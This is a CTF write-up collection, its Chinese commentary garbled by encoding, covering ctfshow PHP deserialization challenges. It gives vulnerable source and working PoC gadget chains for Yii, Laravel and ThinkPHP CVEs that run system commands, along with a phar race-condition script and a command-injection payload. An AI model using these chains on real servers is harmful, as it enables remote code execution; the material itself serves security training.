h1xa@ctfer.com# @link: https://ctfer.com*/session_start();highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;if(isset($_COOKIE[&#x27;msg&#x27;]))&#123; $msg = unserialize(base64_decode($_SESSION[&#x27;msg&#x27;])); if($msg-&gt;token==&#x27;admin&#x27;)&#123; echo $flag; &#125;&#125; ä¸€å¼€å§‹æ²¡çœ‹å‡ºå’Œ web262 æœ‰å•¥åŒºåˆ«ï¼Œä»”ç»†çœ‹äº†ä¸€ä¸‹å‘ç°ï¼Œååºåˆ—åŒ–æ—¶ä½¿ç”¨äº† session è€Œä¸æ˜¯ç›´æ¥é€šè¿‡ Cookie æ¥æ”¶ åšæ³•å’Œ web262ä¸­ç¬¬äºŒç§åšæ³•ä¸€æ ·ï¼Œè™½ç„¶ä¸æ˜¯é€šè¿‡ Cookie æ¥æ”¶ï¼Œä¹Ÿåˆ«å¿˜äº†äº† Cookie çš„ msg å­—æ®µé™„åŠ ä¸ªå€¼ï¼Œä¸ç„¶ä¸æ»¡è¶³ 1if(isset($_COOKIE[&#x27;msg&#x27;]))&#123; å…ˆè¯·æ±‚ index.php ï¼ˆè¿™é‡Œ poc ä¸æ˜ç™½æ€ä¹ˆæ„é€ çœ‹ä¸€ä¸‹ web262 ç¬¬äºŒç§åšæ³•ï¼‰ å› ä¸º PHP çš„ session æ˜¯é€šè¿‡ Cookie é‡Œçš„ PHPSESSID è·å–çš„ï¼ˆä¸æ¸…é™¤å‚è€ƒ web263 session ä¼ªé€ ï¼‰ï¼Œæ‰€ä»¥è¦è®°å½•ä¸‹æ¥ï¼Œç„¶ååœ¨ message.php é‡Œå¸¦ä¸Šã€‚ ç„¶åè¯·æ±‚ä¸€ä¸‹ message.php , åˆ«å¿˜äº† Cookie éƒ¨åˆ† web265 å˜é‡å¼•ç”¨PHP/5.6.40 å˜é‡å¼•ç”¨ 1234567891011121314151617181920212223242526272829303132333435&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-04 23:52:24# @Last Modified by: h1xa# @Last Modified time: 2020-12-05 00:17:08# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);include(&#x27;flag.php&#x27;);highlight_file(__FILE__);class ctfshowAdmin&#123; public $token; public $password; public function __construct($t,$p)&#123; $this-&gt;token=$t; $this-&gt;password = $p; &#125; public function login()&#123; return $this-&gt;token===$this-&gt;password; &#125;&#125;$ctfshow = unserialize($_GET[&#x27;ctfshow&#x27;]);$ctfshow-&gt;token=md5(mt_rand());if($ctfshow-&gt;login())&#123; echo $flag;&#125; token ä¼šå˜ï¼Œè®© password æˆä¸º token çš„å¼•ç”¨å°±å¥½äº† poc 12345678910111213&lt;?phpclass ctfshowAdmin&#123; public $token; public $password;&#125;$admin = new ctfshowAdmin();$admin-&gt;password = &amp;$admin-&gt;token;echo(urlencode(serialize($admin)));?&gt; web266 ç±»å’Œæ–¹æ³•ä¸åŒºåˆ†å¤§å°å†™PHP/7.3.11 PHPç‰¹æ€§ ç±»å’Œæ–¹æ³•ä¸åŒºåˆ†å¤§å°å†™ 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-04 23:52:24# @Last Modified by: h1xa# @Last Modified time: 2020-12-05 00:17:08# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);include(&#x27;flag.php&#x27;);$cs = file_get_contents(&#x27;php://input&#x27;);class ctfshow&#123; public $username=&#x27;xxxxxx&#x27;; public $password=&#x27;xxxxxx&#x27;; public function __construct($u,$p)&#123; $this-&gt;username=$u; $this-&gt;password=$p; &#125; public function login()&#123; return $this-&gt;username===$this-&gt;password; &#125; public function __toString()&#123; return $this-&gt;username; &#125; public function __destruct()&#123; global $flag; echo $flag; &#125;&#125;$ctfshowo=@unserialize($cs);if(preg_match(&#x27;/ctfshow/&#x27;, $cs))&#123; throw new Exception(&quot;Error $ctfshowo&quot;,1);&#125; æ‹¦æˆªç‚¹ï¼šåºåˆ—åŒ–æ•°æ®ä¸èƒ½åŒ…æ‹¬ ctfshowï¼Œ PHPç‰¹æ€§ï¼šå‡½æ•°åå’Œç±»åä¸åŒºåˆ†å¤§å°å†™ï¼Œå˜é‡ååŒºåˆ†ï¼Œä¾‹å¦‚ poc 12345678910&lt;?phpclass Ctfshow&#123;&#125;$user = new Ctfshow();echo(serialize($user));?&gt; web267 Yii æ¡†æ¶ CVEPHP/7.3.11 æ¡†æ¶å®¡è®¡ CVE-2020-15148 Yiiç™»å½•å‰ å¼±å¯†ç  admin/admin ç™»å½• about é¡µé¢æœ‰ä¸ª &lt;!--?view-source --&gt; æç¤º å¯ä»¥é€šè¿‡ index.php?r=site%2Fabout&amp;view-source æŸ¥çœ‹æç¤º è¿™æ˜¯ Yii çš„è·¯ç”±è§„åˆ™ï¼Œä¼ é€é—¨ ï¼Œå’‹çŸ¥é“çš„ Yiiï¼Ÿé€šè¿‡ burp æŠ“åŒ…è®°å½•çœ‹åˆ°å¾ˆå¤š yii.js php æœäº†ä¸‹ ï¼ˆ æ¡†æ¶ååºåˆ—åŒ–æ¼æ´ï¼Œç½‘ä¸Šåº”è¯¥å¯ä»¥æœåˆ°ï¼Œä¸€ä¸ªä¸é”™çš„å¤ç°å’ŒæŒ–æ˜æ–‡ç« ï¼Œä¼ é€é—¨ æœ‰ç©ºä¼šï¼ˆå’•å’•é¢„è®¢â€¦ï¼‰é¢å¤–å†™æ–‡ç« å¤ç° ï¼ˆ poc 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;exec&#x27;; $this-&gt;id = &#x27;cp /fla* tari.txt&#x27;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; $this-&gt;formatters[&#x27;close&#x27;] = [new CreateAction, &#x27;run&#x27;]; &#125; &#125;&#125;namespace yii\\db&#123; use Faker\\Generator; class BatchQueryResult&#123; private $_dataReader; public function __construct()&#123; $this-&gt;_dataReader = new Generator; &#125; &#125;&#125;namespace&#123; echo base64_encode(serialize(new yii\\db\\BatchQueryResult));&#125; web268 Yii æ¡†æ¶ CVE è¡¥ä¸ç»•è¿‡ 1PHP/7.3.11 æ¡†æ¶å®¡è®¡ CVE-2020-15148 Yiiç™»å½•å‰ è¡¥ä¸ç»•è¿‡ æ€è·¯ç±»ä¼¼ web267ï¼Œä¼°è®¡æ˜¯æ‰“è¿‡è¡¥ä¸ç‰ˆæœ¬ æœ‰ç©ºä¼šï¼ˆå’•å’•é¢„è®¢â€¦ï¼‰é¢å¤–å†™æ–‡ç« å¤ç° ï¼ˆ poc1 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;exec&#x27;; $this-&gt;id = &#x27;cp /fla* tari.txt&#x27;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; // è¿™é‡Œéœ€è¦æ”¹ä¸ºisRunning $this-&gt;formatters[&#x27;isRunning&#x27;] = [new CreateAction(), &#x27;run&#x27;]; &#125; &#125;&#125;// poc1namespace Codeception\\Extension&#123; use Faker\\Generator; class RunProcess&#123; private $processes; public function __construct() &#123; $this-&gt;processes = [new Generator()]; &#125; &#125;&#125;namespace&#123; echo base64_encode(serialize(new Codeception\\Extension\\RunProcess()));&#125;?&gt; web269 Yii æ¡†æ¶ CVE è¡¥ä¸ç»•è¿‡ 2PHP/7.3.11 æ¡†æ¶å®¡è®¡ CVE-2020-15148 Yiiç™»å½•å‰ è¡¥ä¸ç»•è¿‡ æ€è·¯ç±»ä¼¼ web267ï¼Œä¼°è®¡æ˜¯æ‰“è¿‡è¡¥ä¸ç‰ˆæœ¬ æœ‰ç©ºä¼šï¼ˆå’•å’•é¢„è®¢â€¦ï¼‰é¢å¤–å†™æ–‡ç« å¤ç° ï¼ˆ poc2 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;exec&#x27;; $this-&gt;id = &#x27;cp /fla* tari.txt&#x27;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; $this-&gt;formatters[&#x27;render&#x27;] = [new CreateAction(), &#x27;run&#x27;]; &#125; &#125;&#125;namespace phpDocumentor\\Reflection\\DocBlock\\Tags&#123; use Faker\\Generator; class See&#123; protected $description; public function __construct() &#123; $this-&gt;description = new Generator(); &#125; &#125;&#125;namespace&#123; use phpDocumentor\\Reflection\\DocBlock\\Tags\\See; class Swift_KeyCache_DiskKeyCache&#123; private $keys = []; private $path; public function __construct() &#123; $this-&gt;path = new See; $this-&gt;keys = array( // æœ‰å°±è¡Œ &quot;suiyi&quot;=&gt;array(&quot;suiyi&quot;=&gt;&quot;suiyi&quot;) ); &#125; &#125; echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));&#125;?&gt; web270 Yii æ¡†æ¶ CVE è¡¥ä¸ç»•è¿‡ 3PHP/7.3.11 æ¡†æ¶å®¡è®¡ CVE-2020-15148 Yiiç™»å½•å‰ è¡¥ä¸ç»•è¿‡ æ€è·¯ç±»ä¼¼ web267ï¼Œä¼°è®¡æ˜¯æ‰“è¿‡è¡¥ä¸ç‰ˆæœ¬ æœ‰ç©ºä¼šï¼ˆå’•å’•é¢„è®¢â€¦ï¼‰é¢å¤–å†™æ–‡ç« å¤ç° ï¼ˆ poc3 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpnamespace yii\\rest &#123; class Action &#123; public $checkAccess; &#125; class IndexAction &#123; public function __construct($func, $param) &#123; $this-&gt;checkAccess = $func; $this-&gt;id = $param; &#125; &#125;&#125;namespace yii\\web &#123; abstract class MultiFieldSession &#123; public $writeCallback; &#125; class DbSession extends MultiFieldSession &#123; public function __construct($func, $param) &#123; $this-&gt;writeCallback = [new \\yii\\rest\\IndexAction($func, $param), &quot;run&quot;]; &#125; &#125;&#125;namespace yii\\db &#123; use yii\\base\\BaseObject; class BatchQueryResult &#123; private $_dataReader; public function __construct($func, $param) &#123; $this-&gt;_dataReader = new \\yii\\web\\DbSession($func, $param); &#125; &#125;&#125;namespace &#123; $exp = new \\yii\\db\\BatchQueryResult(&#x27;exec&#x27;, &#x27;cp /fla* tari.txt&#x27;); echo(base64_encode(serialize($exp)));&#125; web271 Laravel 5.7 æ¡†æ¶ CVEPHP/7.1.26 æ¡†æ¶å®¡è®¡ CVE-2019-9081 Laravel 5.7ç™»å½•å‰ æºç  å¯å‚è€ƒæ–‡ç«  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php/** * Laravel - A PHP Framework For Web Artisans * * @package Laravel * @author Taylor Otwell &lt;taylor@laravel.com&gt; */define(&#x27;LARAVEL_START&#x27;, microtime(true));/*|--------------------------------------------------------------------------| Register The Auto Loader|--------------------------------------------------------------------------|| Composer provides a convenient, automatically generated class loader for| our application. We just need to utilize it! We&#x27;ll simply require it| into the script here so that we don&#x27;t have to worry about manual| loading any of our classes later on. It feels great to relax.|*/require __DIR__ . &#x27;/../vendor/autoload.php&#x27;;/*|--------------------------------------------------------------------------| Turn On The Lights|--------------------------------------------------------------------------|| We need to illuminate PHP development, so let us turn on the lights.| This bootstraps the framework and gets it ready for use, then it| will load up this application so that we can run it and send| the responses back to the browser and delight our users.|*/$app = require_once __DIR__ . &#x27;/../bootstrap/app.php&#x27;;/*|--------------------------------------------------------------------------| Run The Application|--------------------------------------------------------------------------|| Once we have the application, we can handle the incoming request| through the kernel, and send the associated response back to| the client&#x27;s browser allowing them to enjoy the creative| and wonderful application we have prepared for them.|*/$kernel = $app-&gt;make(Illuminate\\Contracts\\Http\\Kernel::class);$response = $kernel-&gt;handle( $request = Illuminate\\Http\\Request::capture());@unserialize($_POST[&#x27;data&#x27;]);highlight_file(__FILE__);$kernel-&gt;terminate($request, $response); poc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phpnamespace Illuminate\\Foundation\\Testing &#123; class PendingCommand &#123; public $test; protected $app; protected $command; protected $parameters; public function __construct($test, $app, $command, $parameters) &#123; $this-&gt;test = $test; //ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\\Auth\\GenericUser $this-&gt;app = $app; //ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\\Foundation\\Application $this-&gt;command = $command; //è¦æ‰§è¡Œçš„phpå‡½æ•° system $this-&gt;parameters = $parameters; //è¦æ‰§è¡Œçš„phpå‡½æ•°çš„å‚æ•° array(&#x27;id&#x27;) &#125; &#125;&#125;namespace Faker &#123; class DefaultGenerator &#123; protected $default; public function __construct($default = null) &#123; $this-&gt;default = $default; &#125; &#125;&#125;namespace Illuminate\\Foundation &#123; class Application &#123; protected $instances = []; public function __construct($instances = []) &#123; $this-&gt;instances[&#x27;Illuminate\\Contracts\\Console\\Kernel&#x27;] = $instances; &#125; &#125;&#125;namespace &#123; $defaultgenerator = new Faker\\DefaultGenerator(array(&quot;hello&quot; =&gt; &quot;world&quot;)); $app = new Illuminate\\Foundation\\Application(); $application = new Illuminate\\Foundation\\Application($app); $pendingcommand = new Illuminate\\Foundation\\Testing\\PendingCommand($defaultgenerator, $application, &#x27;system&#x27;, array(&#x27;cat /flag&#x27;)); echo urlencode(serialize($pendingcommand));&#125; å› ä»£ç é‡Œæ˜¯é€šè¿‡ POST çš„ data æ¥æ”¶ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯ç”¨ data POST è¿‡å» web272 Laravel 5.8 æ¡†æ¶ CVEPHP/7.1.26 æ¡†æ¶å®¡è®¡ Laravel 5.8ç™»å½•å‰ å¯å‚è€ƒæ–‡ç«  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php/** * Laravel - A PHP Framework For Web Artisans * * @package Laravel * @author Taylor Otwell &lt;taylor@laravel.com&gt; */define(&#x27;LARAVEL_START&#x27;, microtime(true));/*|--------------------------------------------------------------------------| Register The Auto Loader|--------------------------------------------------------------------------|| Composer provides a convenient, automatically generated class loader for| our application. We just need to utilize it! We&#x27;ll simply require it| into the script here so that we don&#x27;t have to worry about manual| loading any of our classes later on. It feels great to relax.|*/require __DIR__ . &#x27;/../vendor/autoload.php&#x27;;/*|--------------------------------------------------------------------------| Turn On The Lights|--------------------------------------------------------------------------|| We need to illuminate PHP development, so let us turn on the lights.| This bootstraps the framework and gets it ready for use, then it| will load up this application so that we can run it and send| the responses back to the browser and delight our users.|*/$app = require_once __DIR__ . &#x27;/../bootstrap/app.php&#x27;;/*|--------------------------------------------------------------------------| Run The Application|--------------------------------------------------------------------------|| Once we have the application, we can handle the incoming request| through the kernel, and send the associated response back to| the client&#x27;s browser allowing them to enjoy the creative| and wonderful application we have prepared for them.|*/$kernel = $app-&gt;make(Illuminate\\Contracts\\Http\\Kernel::class);$response = $kernel-&gt;handle( $request = Illuminate\\Http\\Request::capture());@unserialize($_POST[&#x27;data&#x27;]);highlight_file(__FILE__);$kernel-&gt;terminate($request, $response); æœ‰ç©ºä¼šï¼ˆå’•å’•é¢„è®¢â€¦ï¼‰é¢å¤–å†™æ–‡ç« å¤ç° ï¼ˆ poc 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phpnamespace PhpParser\\Node\\Scalar\\MagicConst&#123; class Line &#123;&#125;&#125;namespace Mockery\\Generator&#123; class MockDefinition &#123; protected $config; protected $code; public function __construct($config, $code) &#123; $this-&gt;config = $config; $this-&gt;code = $code; &#125; &#125;&#125;namespace Mockery\\Loader&#123; class EvalLoader&#123;&#125;&#125;namespace Illuminate\\Bus&#123; class Dispatcher &#123; protected $queueResolver; public function __construct($queueResolver) &#123; $this-&gt;queueResolver = $queueResolver; &#125; &#125;&#125;namespace Illuminate\\Foundation\\Console&#123; class QueuedCommand &#123; public $connection; public function __construct($connection) &#123; $this-&gt;connection = $connection; &#125; &#125;&#125;namespace Illuminate\\Broadcasting&#123; class PendingBroadcast &#123; protected $events; protected $event; public function __construct($events, $event) &#123; $this-&gt;events = $events; $this-&gt;event = $event; &#125; &#125;&#125;namespace&#123; $line = new PhpParser\\Node\\Scalar\\MagicConst\\Line(); $mockdefinition = new Mockery\\Generator\\MockDefinition($line,&quot;&lt;?php system(&#x27;cat /f*&#x27;);exit;?&gt;&quot;); $evalloader = new Mockery\\Loader\\EvalLoader(); $dispatcher = new Illuminate\\Bus\\Dispatcher(array($evalloader,&#x27;load&#x27;)); $queuedcommand = new Illuminate\\Foundation\\Console\\QueuedCommand($mockdefinition); $pendingbroadcast = new Illuminate\\Broadcasting\\PendingBroadcast($dispatcher,$queuedcommand); echo urlencode(serialize($pendingbroadcast));&#125;?&gt; å…¶å®è¿˜æœ‰æŒºå¤šé“¾çš„ https://www.anquanke.com/post/id/189718 web273 å’Œweb273ä¸€æ ·PHP/7.1.32æ¡†æ¶å®¡è®¡Laravel 5.8ç™»å½•å‰ PHP/7.1.32 æ¡†æ¶å®¡è®¡ Laravel 5.8ç™»å½•å‰ emmï¼Œè¯´å®è¯é™¤äº†PHPç‰ˆæœ¬ç»†å¾®å·®åˆ«ï¼Œè¿˜ä¸çŸ¥é“æœ‰å•¥åŒºåˆ«ï¼Œç«Ÿç„¶ poc ä¸€æ¯›ä¸€æ · æœ‰ç©ºä¼šï¼ˆå’•å’•é¢„è®¢â€¦ï¼‰é¢å¤–å†™æ–‡ç« å¤ç° ï¼ˆ web274 thinkphp5.1nginx/1.16.1 PHP/7.3.11 æ¡†æ¶å®¡è®¡ thinkphp5.1 thinkphp 5.1ååºåˆ—åŒ–æ¼æ´ å‚è€ƒæ–‡ç« ï¼šhttps://xz.aliyun.com/t/6619 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpnamespace think;abstract class Model&#123; protected $append = []; private $data = []; function __construct()&#123; $this-&gt;append = [&quot;lin&quot;=&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]]; $this-&gt;data = [&quot;lin&quot;=&gt;new Request()]; &#125;&#125;class Request&#123; protected $hook = []; protected $filter = &quot;system&quot;; protected $config = [ // è¡¨å•ajaxä¼ªè£…å˜é‡ &#x27;var_ajax&#x27; =&gt; &#x27;_ajax&#x27;, ]; function __construct()&#123; $this-&gt;filter = &quot;system&quot;; $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#x27;lin&#x27;]; $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]]; &#125;&#125;namespace think\\process\\pipes;use think\\model\\concern\\Conversion;use think\\model\\Pivot;class Windows&#123; private $files = []; public function __construct() &#123; $this-&gt;files=[new Pivot()]; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;use think\\process\\pipes\\Windows;echo base64_encode(serialize(new Windows()));?&gt; æ•°æ®æ¥æ”¶æ–¹å¼ æœ‰ç©ºä¼šï¼ˆå’•å’•é¢„è®¢â€¦ï¼‰é¢å¤–å†™æ–‡ç« å¤ç° ï¼ˆ poc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpnamespace think;abstract class Model&#123; protected $append = []; private $data = []; function __construct()&#123; $this-&gt;append = [&quot;lin&quot;=&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]]; $this-&gt;data = [&quot;lin&quot;=&gt;new Request()]; &#125;&#125;class Request&#123; protected $hook = []; protected $filter = &quot;system&quot;; protected $config = [ // è¡¨å•ajaxä¼ªè£…å˜é‡ &#x27;var_ajax&#x27; =&gt; &#x27;_ajax&#x27;, ]; function __construct()&#123; $this-&gt;filter = &quot;system&quot;; $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#x27;lin&#x27;]; $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]]; &#125;&#125;namespace think\\process\\pipes;use think\\model\\concern\\Conversion;use think\\model\\Pivot;class Windows&#123; private $files = []; public function __construct() &#123; $this-&gt;files=[new Pivot()]; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;use think\\process\\pipes\\Windows;echo base64_encode(serialize(new Windows()));?&gt; web275 å‘½ä»¤æ‰§è¡Œæ‹¼æ¥PHP/7.3.11 nginx/1.16.1 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-08 19:13:36# @Last Modified by: h1xa# @Last Modified time: 2020-12-08 20:08:07# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);class filter&#123; public $filename; public $filecontent; public $evilfile=false; public function __construct($f,$fn)&#123; $this-&gt;filename=$f; $this-&gt;filecontent=$fn; &#125; public function checkevil()&#123; if(preg_match(&#x27;/php|\\.\\./i&#x27;, $this-&gt;filename))&#123; $this-&gt;evilfile=true; &#125; if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123; $this-&gt;evilfile=true; &#125; return $this-&gt;evilfile; &#125; public function __destruct()&#123; if($this-&gt;evilfile)&#123; system(&#x27;rm &#x27;.$this-&gt;filename); &#125; &#125;&#125;if(isset($_GET[&#x27;fn&#x27;]))&#123; $content = file_get_contents(&#x27;php://input&#x27;); $f = new filter($_GET[&#x27;fn&#x27;],$content); if($f-&gt;checkevil()===false)&#123; file_put_contents($_GET[&#x27;fn&#x27;], $content); copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;); unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]); echo &#x27;work done&#x27;; &#125; &#125;else&#123; echo &#x27;where is flag?&#x27;;&#125;where is flag? åˆ†æï¼š çœ‹ä¼¼èŠ±é‡Œèƒ¡å“¨ï¼Œå…¶å® __destruct é‡Œçš„ system å¯ç›´æ¥æ‹¼æ¥ï¼Œä¹Ÿå°±æ˜¯è®¾æ³•è®© $this-&gt;evilfile ç½®ä¸º true ï¼Œç„¶åæ‹¼æ¥å‘½ä»¤å³å¯ã€‚ é¢˜å¤–ï¼šç¬¬ä¸€çœ¼çœ‹å»è¿™ä¸€è¯»ä¸€å†™ï¼Œé•¿çš„è¿™ä¹ˆæƒ³è¢«æˆ‘æ¡ä»¶ç«äº‰çš„æ ·å­ ï¼ˆ web276 pharååºåˆ—åŒ– æ¡ä»¶ç«äº‰nginx/1.16.1 PHP/7.3.11 pharååºåˆ—åŒ– æ¡ä»¶ç«äº‰ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-08 19:13:36# @Last Modified by: h1xa# @Last Modified time: 2020-12-08 20:08:07# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);class filter&#123; public $filename; public $filecontent; public $evilfile=false; public $admin = false; public function __construct($f,$fn)&#123; $this-&gt;filename=$f; $this-&gt;filecontent=$fn; &#125; public function checkevil()&#123; if(preg_match(&#x27;/php|\\.\\./i&#x27;, $this-&gt;filename))&#123; $this-&gt;evilfile=true; &#125; if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123; $this-&gt;evilfile=true; &#125; return $this-&gt;evilfile; &#125; public function __destruct()&#123; if($this-&gt;evilfile &amp;&amp; $this-&gt;admin)&#123; system(&#x27;rm &#x27;.$this-&gt;filename); &#125; &#125;&#125;if(isset($_GET[&#x27;fn&#x27;]))&#123; $content = file_get_contents(&#x27;php://input&#x27;); $f = new filter($_GET[&#x27;fn&#x27;],$content); if($f-&gt;checkevil()===false)&#123; file_put_contents($_GET[&#x27;fn&#x27;], $content); copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;); unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]); echo &#x27;work done&#x27;; &#125; &#125;else&#123; echo &#x27;where is flag?&#x27;;&#125;where is flag? åˆ†æï¼š emmï¼Œåœ¨ä¸Šé¢˜åŸºç¡€ä¸Šæ–°å¢äº†ä¸ªåˆ¤æ–­ $this-&gt;admin ç„¶åæƒ³ç€ï¼Œæ„é€ ä¸€ä¸‹åºåˆ—åŒ–ä¸å°±è¡Œäº†å˜›ï¼Œç„¶åå‘ç°æ²¡æœ‰ååºåˆ—åŒ–å‡½æ•°ã€‚ã€‚ çœ‹äº†ä¸‹å‘ç°å¯ä»¥é€šè¿‡ file_put_contents å†™ pharæ–‡ä»¶ï¼Œç„¶åé¢˜ç›®ä¸­ file_put_contents ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ phar:// åè®®ï¼Œé€šè¿‡ $content ä¼ å…¥ phar æ•°æ®ï¼Œè¿™æ ·åœ¨ PHP é€šè¿‡ phar:// åè®®è§£ææ•°æ®æ—¶ï¼Œä¼šå°† meta-data éƒ¨åˆ†è¿›è¡Œååºåˆ—åŒ–ã€‚ ä¸è¿‡é¢˜ç›®ä¼šåˆ é™¤æ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦åœ¨åˆ é™¤æ–‡ä»¶å‰æ‰§è¡Œæ–‡ä»¶è¿›è¡Œä»¥ä¸Šæ“ä½œï¼Œå› æ­¤è¦ç”¨åˆ°æ¡ä»¶ç«äº‰ï¼Œå³ç”Ÿæˆäº† phar æ–‡ä»¶ï¼Œåœ¨æçŸ­æ—¶é—´å†…æ–‡ä»¶æ˜¯å­˜åœ¨çš„ï¼Œå› ä¸ºæ‰§è¡Œåˆ° unlink å‡½æ•°å‰è¿˜æœ‰ä¸€ä¸ª copy æ–‡ä»¶æ“ä½œï¼Œç£ç›˜ io æ˜¯éœ€è¦ä¸€å®šæ—¶é—´çš„ã€‚åªè¦æˆ‘ä»¬ä¸æ–­åœ¨å†™å…¥ phar æ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥æ–­æ–­ç»­ç»­è®¿é—®åˆ°~ poc pharæ„é€ å¦‚ä¸‹ï¼Œä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆ evil.phar æ–‡ä»¶ 123456789101112131415161718192021222324252627&lt;?phpclass filter &#123; public $filename = &#x27;;cat fl*&#x27;; public $evilfile = true; public $admin = true;&#125;// åç¼€å¿…é¡»ä¸ºphar$phar = new Phar(&quot;evil.phar&quot;);$phar-&gt;startBuffering();// è®¾ç½® stubb, å¢åŠ  gif æ–‡ä»¶å¤´$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$o = new filter();/** * å°†è‡ªå®šä¹‰çš„ meta-data å­˜å…¥ manifest * è¿™ä¸ªå‡½æ•°éœ€è¦åœ¨php.iniä¸­ä¿®æ”¹ phar.readonly ä¸º Off * å¦åˆ™çš„è¯ä¼šæŠ›å‡º * creating archive &quot;***.phar&quot; disabled by the php.ini setting phar.readonly * å¼‚å¸¸. */$phar-&gt;setMetadata($o);// æ·»åŠ éœ€å‹ç¼©çš„æ–‡ä»¶$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt; æ¡ä»¶ç«äº‰ï¼Œpy3è„šæœ¬ 1234567891011121314151617181920212223242526272829import base64import requestsimport threadingflag = Falseurl = &#x27;http://0f5a5b64-ef6b-4317-b093-3f2fc62f1df9.challenge.ctf.show:8080/&#x27;data = open(&#x27;./evil.phar&#x27;, &#x27;rb&#x27;).read()pre_resp = requests.get(url)if pre_resp.status_code != 200: print(url + &#x27;\\né“¾æ¥å¥½åƒæŒ‚äº†....&#x27;) exit(1)def upload(): requests.post(url+&quot;?fn=evil.phar&quot;, data=data)def read(): global flag r = requests.post(url+&quot;?fn=phar://evil.phar/&quot;, data=&quot;&quot;) if &quot;ctfshow&#123;&quot; in r.text and flag is False: print(base64.b64encode(r.text.encode())) flag = Truewhile flag is False: a = threading.Thread(target=upload) b = threading.Thread(target=read) a.start() b.start() base64è§£ç ä¸€ä¸‹å³å¯ é¢˜å¤– é™¤äº† file_put_contents å¤–ï¼Œä¼šæŠŠ phar ååºåˆ—åŒ–çš„å‡½æ•°è¿˜æœ‰ï¼š å—å½±å“çš„å‡½æ•°åˆ—è¡¨ filename filectime (è·å–æ–‡ä»¶çš„inodeæ›´æ”¹æ—¶é—´) file_exists file_get_contents file_put_contents file filegroup (è·å–æ–‡ä»¶çš„ç»„å) fopen fileinode ï¼ˆè·å–æ–‡ä»¶inodeï¼‰ filemtime ï¼ˆè·å–æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´ï¼‰ fileowner fileperms ï¼ˆè·å–æ–‡ä»¶æƒé™ï¼‰ is_dir is_executable is_file is_link ï¼ˆåˆ¤æ–­æ–‡ä»¶åæ˜¯å¦ä¸ºç¬¦å·é“¾æ¥ï¼‰ is_readable is_writable is_writeable parse_ini_file ï¼ˆè§£æé…ç½®æ–‡ä»¶ï¼‰ copy unlink stat ï¼ˆè·å–æ–‡ä»¶ç›¸å…³ä¿¡æ¯ï¼‰ readfile 